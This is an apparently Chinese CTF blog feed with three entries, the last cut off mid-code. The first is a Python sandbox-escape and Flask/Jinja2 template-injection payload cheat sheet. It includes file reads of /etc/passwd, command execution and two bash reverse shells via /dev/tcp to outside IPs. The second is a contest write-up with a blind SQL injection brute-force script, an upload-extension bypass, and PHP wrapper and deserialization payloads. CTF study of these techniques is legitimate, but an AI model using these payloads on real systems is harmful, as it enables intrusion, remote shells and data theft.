    <content type="html"><![CDATA[<p>现在比赛Python的站点越来越多，发一些绕过python限制的东西作为以后备用嘿嘿嘿</p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>Python2.7和3.5默认使用的序列化格式有所区别，一般带有括号和换行的序列化数据是2.7使用的，而包含\x00的一般是3.5使用的。windows 和 linux 反序列化的数据是不同的</p><h1 id="沙盒绕过"><a href="#沙盒绕过" class="headerlink" title="沙盒绕过"></a>沙盒绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># read 函数，读文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&apos;abc.php&apos;).read()</span><br><span class="line"># write 函数，写文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&apos;/var/www/html/input&apos;, &apos;w&apos;).write(&apos;123&apos;)</span><br><span class="line"># 执行任意命令</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls /var/www/html&quot;).read()&apos; )</span><br><span class="line"># 通过 system 执行任意命令</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;id&apos;)</span><br><span class="line"># 通过 popen 执行任意命令</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&apos;func_globals&apos;)[&apos;linecache&apos;].__dict__[&apos;os&apos;].__dict__[&apos;popen&apos;](&apos;id&apos;).read()</span><br><span class="line"># 打包文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&apos;func_globals&apos;)[&apos;linecache&apos;].__dict__[&apos;os&apos;].__dict__[&apos;popen&apos;](&apos;tar -czvf /tmp/www.tar.gz /home/ctf/www&apos;).read()</span><br><span class="line"># base64 编码读取文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&apos;func_globals&apos;)[&apos;linecache&apos;].__dict__[&apos;os&apos;].__dict__[&apos;popen&apos;](&apos;base64 /tmp/www.tar.gz&apos;).read()</span><br></pre></td></tr></table></figure><h1 id="Flask-Jinja2模板注入"><a href="#Flask-Jinja2模板注入" class="headerlink" title="Flask/Jinja2模板注入"></a>Flask/Jinja2模板注入</h1><h2 id="首先验证一下漏洞看有没有回显"><a href="#首先验证一下漏洞看有没有回显" class="headerlink" title="首先验证一下漏洞看有没有回显"></a>首先验证一下漏洞看有没有回显</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.10/&#123;&#123;1+2&#125;&#125;</span><br><span class="line">http://192.168.1.10/?name=&#123;&#123;1+2&#125;&#125;</span><br><span class="line">http://192.168.1.10/?name=&#123;&#123;1^0&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后可以获取配置信息试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Flask模版中的一个全局对象，包含了应用程序的配置值</span><br><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line"># 与服务器环境相关的对象字典</span><br><span class="line">&#123;&#123;request.environ&#125;&#125;</span><br></pre></td></tr></table></figure></p><h2 id="利用方法（python2-7）"><a href="#利用方法（python2-7）" class="headerlink" title="利用方法（python2.7）"></a>利用方法（python2.7）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 读文件</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;1.txt&apos;).read()</span><br><span class="line"># 写文件</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;2.txt&apos;,&apos;w&apos;).write(&apos;Write it!&apos;)</span><br><span class="line"># 读文件，base64编码</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;1.txt&apos;).read().encode(&apos;base64&apos;)</span><br><span class="line"># 通过 subprocess.Popen 执行 shell 命令</span><br><span class="line">&apos;&apos;[&apos;__class__&apos;][&apos;__mro__&apos;].__getitem__(2)[&apos;__subclasses__&apos;]()[230]([&apos;ls&apos;, &apos;-al&apos;, &apos;/home&apos;],stdout=-1)[&apos;communicate&apos;]()</span><br><span class="line"># 通过 os.popen 执行 shell 命令</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].os.popen(&apos;id&apos;).read()</span><br><span class="line"></span><br><span class="line"># eval python code __import__(&quot;sys&quot;).version</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 121, 115, 34, 41, 46, 118, 101, 114, 115, 105, 111, 110]).__str__()</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, &apos;os.system(&quot;ls&quot;)&apos;)</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&apos;func_global&apos;+&apos;s&apos;)[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/172.6.6.6/9999 0&gt;&amp;1&quot;&apos;)</span><br></pre></td></tr></table></figure><h2 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 读写文件</span><br><span class="line">&apos;&apos;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;/etc/passwd&apos;).read()</span><br><span class="line"></span><br><span class="line"># 得到eval函数</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;]</span><br><span class="line"># 读写文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;open(&apos;/etc/passwd&apos;).read()&quot;)</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;/etc/passwd&apos;).read()</span><br><span class="line"># 执行命令</span><br><span class="line"># 得到system，system执行命令不会有回显</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).system(&apos;ls&apos;)</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).popen(&apos;cat /etc/passwd&apos;).read()</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;subprocess&apos;).Popen([&apos;cat&apos;, &apos;/etc/passwd&apos;]).read()</span><br><span class="line"># 反弹shell</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).system(&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.85.146/4545 0&gt;&amp;1&quot;&apos;)</span><br></pre></td></tr></table></figure><h1 id="有的需要绕过过滤"><a href="#有的需要绕过过滤" class="headerlink" title="有的需要绕过过滤"></a>有的需要绕过过滤</h1><p><code>{(&#39;&#39;|attr(&#39;__class__&#39;)}}，{(&#39;&#39;[&#39;__class__&#39;])}}</code>和<code></code>一样的<br>空格可以用tab(%09)绕过<br>| 后不允许接a-z可以用%0c，tab等绕过<br>os可以通过python中exec绕过<br>如果过滤仅限于 request.args 但是不允许 post，简单的办法是可以用request.cookies来绕过<br>flask和django的模板注入还有一种内置方法<code>request.__class__</code>效果等于<code>request|attr(&#39;__class__&#39;)</code><br>通过参数引入字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?secret=&#123;&#123;request.args.class.join((request.args.usc*2,request.args.usc*2))&#125;&#125;&amp;usc=_&amp;class=class</span><br></pre></td></tr></table></figure></p><p>通过设定变量提前创建好变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?secret=&#123;%set%09class=request.args.class.join((request.args.usc*2,request.args.usc*2))%&#125;&#123;&#123;class&#125;&#125;&amp;usc=_&amp;class=class</span><br></pre></td></tr></table></figure></p><h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p>利用字符串 format 的漏洞，如果格式化字符串的内容可以被控制，就能输出一些敏感信息，但是无法执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class User(object):</span><br><span class="line">    def __init__(self, name):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line"># a == joe</span><br><span class="line">input_t = &apos;&#123;0.name&#125;&apos;</span><br><span class="line">a = input_t.format(User(&apos;joe&apos;))</span><br><span class="line"></span><br><span class="line"># a == joe</span><br><span class="line">input_t = &apos;&#123;user.name&#125;&apos;</span><br><span class="line">a = input_t.format(user=User(&apos;joe&apos;))</span><br></pre></td></tr></table></figure></p><p>本文参考：<a href="https://www.restran.net/2018/10/29/ctf-python-vulnerability-notes/" target="_blank" rel="noopener">https://www.restran.net/2018/10/29/ctf-python-vulnerability-notes/</a></p>]]></content>
    
    <summary type="html">
    
      python各类技巧
    
    </summary>
    
      <category term="CTF积累" scheme="http://bobosec.top/categories/CTF%E7%A7%AF%E7%B4%AF/"/>
    
    
      <category term="日积月累" scheme="http://bobosec.top/tags/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF/"/>
    
  </entry>
  
  <entry>
    <title>2018中原工学院校赛题解</title>
    <link href="http://bobosec.top/2018/12/23/zhongyuan/"/>
    <id>http://bobosec.top/2018/12/23/zhongyuan/</id>
    <published>2018-12-23T04:16:20.000Z</published>
    <updated>2018-12-23T13:05:07.425Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><a href="http://39.108.109.85:9000" target="_blank" rel="noopener">http://39.108.109.85:9000</a><br>先开始有点懵逼，查看源代码无果（讲道理这个前端写的挺好看），然后看了一下响应头，发现了tips<br><img src="/2018/12/23/zhongyuan/1.jpg" alt=" "><br>访问发现一段代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag = &quot;***&quot;;</span><br><span class="line">if (isset($_GET[&apos;repo&apos;])) &#123;  </span><br><span class="line">    if (strcmp($_GET[&apos;repo&apos;], $flag) == 0) </span><br><span class="line">        die(&apos;Flag: &apos;.$flag);  </span><br><span class="line">    else  </span><br><span class="line">        print &apos;No&apos;;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>这个代码大概就是说需要用repo和flag比较两个字符串是否一样，strcmp()这个函数就是比较两个字符串是否一样，一样返回0。实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。但是我们仍然可以使用这个漏洞对使用老版本php的网站进行渗透测试。<br>于是我们知道了，repo是一个数组或者一个object即可payload如下：<br><code>http://39.108.109.85:9000/?repo[]=0</code><br><code>Flag: drops{589c76a724af0a8303862a900f74d5e4}</code></p><h2 id="上官婉儿"><a href="#上官婉儿" class="headerlink" title="上官婉儿"></a>上官婉儿</h2><p>39.108.109.85:9001<br>打开发现是个注入，测试一下过滤，发现单引号可以，但是不能and，union等等…<br>直接贴脚本爆库名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">payload = &quot;select group_concat(schema_name) from information_schema.schemata&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    for j in &quot;qazxswedcvfrtgbnhyujmkiolp1234567890@,!+_&quot;:</span><br><span class="line">        url = f&quot;http://39.108.109.85:9001/?id=if(mid((&#123;payload&#125;),&#123;i&#125;,1) regexp &apos;&#123;j&#125;&apos;,1,2)&quot;</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        if &quot;Your id is 1&quot; in r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            break</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure></p><p>最后出来的库名<br><img src="/2018/12/23/zhongyuan/sql1.jpg" alt=" "><br>md5加密一下加上drops{}就好<br><code>drops{184b3f811e4e3f2eb9d763cd33dffdf6}</code></p><h2 id="快一点"><a href="#快一点" class="headerlink" title="快一点"></a>快一点</h2><p><a href="http://96.45.177.217:7070/" target="_blank" rel="noopener">http://96.45.177.217:7070/</a><br>这个打开看到<code>You need get a &#39;t&#39;</code>然后get一个t上去可以看到源码<br><a href="http://96.45.177.217:7070/?t" target="_blank" rel="noopener">http://96.45.177.217:7070/?t</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">if(isset($_GET[&apos;t&apos;]))&#123;</span><br><span class="line">    $_COOKIE[&apos;bash_token&apos;] = $_GET[&apos;t&apos;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;You need get a &apos;t&apos;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_POST[&apos;sleep&apos;]))&#123;</span><br><span class="line">    if(!is_numeric($_POST[&apos;sleep&apos;]))&#123;              </span><br><span class="line">                                      </span><br><span class="line">        echo &apos;Gime me a number plz.&apos;;</span><br><span class="line">    &#125;else if($_POST[&apos;sleep&apos;] &lt; 60 * 60 * 24 * 30 * 2)&#123;   </span><br><span class="line">        echo &apos;NoNoNo sleep too short.&apos;;</span><br><span class="line">    &#125;else if($_POST[&apos;sleep&apos;] &gt; 60 * 60 * 24 * 30 * 3)&#123;</span><br><span class="line">        echo &apos;NoNoNo sleep too long.&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        sleep((int)$_POST[&apos;sleep&apos;]);  </span><br><span class="line">        getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>这个代码意思是要给sleep一个值，必须按照那个规定，然后sleep那么多秒才给你flag，但是这里有is_numeric()和int()<br>前者支持普通数字型、科学记数法型、部分支持十六进制0x型，在is_numeric()支持的形式中，int()不能正确转换十六进制型、科学计数法型。<br>因此可以构造6e6、0x4F1A01。<br>最后一直没有flag。。。浏览器的锅，换成bp一下就好了<br><img src="/2018/12/23/zhongyuan/快一点.jpg" alt=" "><br><code>drops{2018_ctf_zhongyuangong_xiaosai}</code></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><a href="http://96.45.177.217:8080/" target="_blank" rel="noopener">http://96.45.177.217:8080/</a><br>这个题目是一个简单的文件上传，但是肯定不允许php后缀，我们可以绕过一下，我尝试了phtml，php4等等发现都可以传成功，但是没有路径，没法用菜刀<br>很迷一直。。。知道私聊了一下工作人员，他说这个题只要姿势对了就是没有路径显示，直接出flag，所以又厚脸皮要了hint<br>直接改文件后缀为<code>pht</code>就行，flag直接出来了<br><img src="/2018/12/23/zhongyuan/pht.jpg" alt=" "><br><code>drops{d0df0djkljsdf122120dsfdsfsf}</code></p><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p><a href="http://39.106.148.174:8666/" target="_blank" rel="noopener">http://39.106.148.174:8666/</a><br>查看源代码看到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[&quot;user&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$pass = $_GET[&quot;pass&quot;];</span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&quot;;</span><br><span class="line">    include($file); //class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个大概意思就是必须要user=admin，还要有你要读取的文件，还有要你的密码<br>这个题目考察的是php封装协议，这个题目首先要突破的是：<br>if(isset($user)&amp;&amp;(file_get_contents($user,’r’)===”admin”))<br>如何让file_get_contents($user,’r’)===”admin”呢？<br>答案是用php的封装协议php://input，因为php：//input可以得到原始的post数据： 首先我们用php伪协议构造admin<br><img src="/2018/12/23/zhongyuan/4.jpg" alt=" "><br>看到已经成功成为了admin，绕过第一层，然后我们看到有个class.php，我们用php的另一个封装协议：<code>php://filter</code><br>利用这个协议就可以读取任意文件了<br>利用方法：<code>php://filter/convert.base64-encode/resource=class.php</code><br>这里把读取到的class.php的内容转换为base64的格式<br>下图是我解码完的<br><img src="/2018/12/23/zhongyuan/3.jpg" alt=" "><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"> </span><br><span class="line">class Read&#123;//flag.php</span><br><span class="line">    public $file;</span><br><span class="line">    public function _toString()&#123;</span><br><span class="line">        if(isset($this-&gt;file))&#123;</span><br><span class="line">            echo file_get_contents($this-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;_toString was called!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>此时想构造pass参数获得Read类中的file变量并且观察到有魔术方法想到php反序列化漏洞<br>这里贴一张构造的图<br><img src="/2018/12/23/zhongyuan/反序列化.jpg" alt=" "><br>最后payload：<code>/?user=php://input&amp;file=class.php&amp;pass=O:4:%22Read%22:1:{s:4:%22file%22;s:10:%22./flag.php%22;}</code><br><img src="/2018/12/23/zhongyuan/反2.jpg" alt=" "><br><code>drops{asfhdi_fj12sh}</code></p><h1 id="CPYTO"><a href="#CPYTO" class="headerlink" title="CPYTO"></a>CPYTO</h1><p>你了解我么<br><a href="http://39.108.109.85/pic.jpg" target="_blank" rel="noopener">http://39.108.109.85/pic.jpg</a><br>先开始这个题一直是个盲文表。。。一脸懵逼，后来出题人改了一下题目，打开是一个海伦凯勒<br>然后对照盲文表<br><img src="/2018/12/23/zhongyuan/111.jpg" alt=" "><br>解出来<code>kmdonowg</code>，题目说了md5加密一下即可得到<br><code>drops{8aa5b596bf284a6dd446f9e141b47861}</code></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p>先开始图片给错了。。。尝试各种姿势无果，后来新给的图片，binwalk -e 一下就会看到有个2.txt文件，打开发现是个png头，于是修改后缀名为png<br>可以得到如图一张图片<br><img src="/2018/12/23/zhongyuan/misc.jpg" alt=" "><br>把上面的字符记下来<code>qebcf{nfqs25kjps8rjsi8kfqnfp42kizaoip}</code>，不过这不是真flag，flag需要drops开头，想到凯撒移位<br><img src="/2018/12/23/zhongyuan/misc1.jpg" alt=" "><br>得到<code>drops{asdf25xwcf8ewfv8xsdasc42xvmnbvc}</code></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><p><a href="https://pan.baidu.com/s/1b_JMVA1Zb_U0ZlXnnLlcgg" target="_blank" rel="noopener">https://pan.baidu.com/s/1b_JMVA1Zb_U0ZlXnnLlcgg</a> 提取码：dfk1<br>本题主要在于二叉树的构造，得出要选出的节点的红黑值，根据要求进行ASCII码的运算即可得出flag。<br><img src="/2018/12/23/zhongyuan/re1.jpg" alt=" "><br>打开试题的README.txt文件,可以看到一段base64编码的密文，使用base64解码<br><img src="/2018/12/23/zhongyuan/re2.jpg" alt=" "><br>得到明文如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.这是一棵红黑树</span><br><span class="line">2.树从1-59上的果子依次为 1ek`~3c:ef017b744/b38fd~abm7g5489e2|lo|z8d16haen98&#125;bt-21s.e:</span><br><span class="line">3.依次从树上取走第 18,35,53,50,14,28,19,6,54,36 个果子,过程中保持红黑树性质不变</span><br><span class="line">4.tmpflag为第 8,56,47,37,52,38,17,8,8,29,7,47,40,57,46,24,34,34,57,29,22,5,16,57,24,29,8,12,57,12,12,21,33,34,55,51,22,45,34,31,1,23 个果子</span><br><span class="line">5.flag为 tmpflag 红色果子 ASCII +1 , 黑色果子 ASCII-1</span><br><span class="line">6.让我们愉快的开始获取flag吧</span><br></pre></td></tr></table></figure></p><p>按照规则3对题目给的红黑树进行节点的删除（可以在线生成红黑树）试验一下，按层生成红黑树然后删除相应地节点得到8,56,47,37,52,38,17,8,8,29,7,47,40,57,46,24,34,34,57,29,22,5,16,57,24,29,8,12,57,12,12,21,33,34,55,51,22,45,34,31,1,23这些节点的红（r表示）黑（b表示）值是bbrrbbrbbbbrbrbrbbrbrrbrrbbbrbbbrbrrrrbrbb</p><p>编写脚本进行输出就可以得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int main()&#123;</span><br><span class="line">    string s=&quot;1ek`~3c:ef017b744/b38fd~abm7g5489e2|lo|z8d16haen98&#125;bt-21s.e:&quot;; </span><br><span class="line">    int n[60]=&#123;8,56,47,37,52,38,17,8,8,29,7,47,40,57,46,24,34,34,57,29,22,5,16,57,24,29,8,12,57,12,12,21,33,34,55,51,22,45,34,31,1,23&#125;;</span><br><span class="line">    string s1=&quot;bbrrbbrbbbbrbrbrbbrbrrbrrbbbrbbbrbrrrrbrbb&quot;;</span><br><span class="line">    int i=0;</span><br><span class="line">    while(i&lt;42)&#123;</span><br><span class="line">        char t;</span><br><span class="line">        switch(s1[i])&#123;</span><br><span class="line">            case &apos;r&apos;:t=s[n[i]]+1;break;</span><br><span class="line">            case &apos;b&apos;:t=s[n[i]]-1;break;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;t;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2018/12/23/zhongyuan/re3.jpg" alt=" "><br>得到flag，把<code>/</code>替换成<code>-</code>即可</p><h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><p>这个题。。。原题，直接贴链接<br><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=813470&amp;extra=page%3D1&amp;page=1" target="_blank" rel="noopener">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=813470&amp;extra=page%3D1&amp;page=1</a></p><p>本次比赛题目有的题真的有点意思（为没做出来的web500打call）菜鸡还得加油鸭</p>]]></content>
    
    <summary type="html">
    
      2018中原工学院校赛
    
    </summary>
    
      <category term="Writeup" scheme="http://bobosec.top/categories/Writeup/"/>
    
    
      <category term="各类WP" scheme="http://bobosec.top/tags/%E5%90%84%E7%B1%BBWP/"/>
    
  </entry>
  
  <entry>
    <title>安恒十二月月赛题解</title>
    <link href="http://bobosec.top/2018/12/22/anheng-12/"/>
    <id>http://bobosec.top/2018/12/22/anheng-12/</id>
    <published>2018-12-22T06:14:05.000Z</published>
    <updated>2018-12-22T09:59:00.176Z</updated>
    
    <content type="html"><![CDATA[<p>想好好打一次安恒的月赛，而且据说这次比较简单</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h2><p>这个上来就是代码审计（php菜的扣脚的我慢慢百度）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line">@error_reporting(1); </span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">class baby </span><br><span class="line">&#123;   </span><br><span class="line">    public $file;</span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;          </span><br><span class="line">        if(isset($this-&gt;file)) </span><br><span class="line">        